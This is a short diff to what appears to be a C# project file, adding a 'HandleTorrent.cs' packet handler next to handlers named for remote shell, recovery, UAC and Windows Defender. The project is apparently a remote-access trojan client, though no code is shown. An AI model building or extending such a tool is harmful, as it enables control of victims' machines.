@@ -90,6 +90,7 @@
     <Compile Include="Handle Packet\HandleReportWindow.cs" />
     <Compile Include="Handle Packet\HandlerRecovery.cs" />
     <Compile Include="Handle Packet\HandleShell.cs" />
+    <Compile Include="Handle Packet\HandleTorrent.cs" />
     <Compile Include="Handle Packet\HandleUAC.cs" />
     <Compile Include="Handle Packet\HandleUninstall.cs" />
     <Compile Include="Handle Packet\HandleWindowsDefender.cs" />
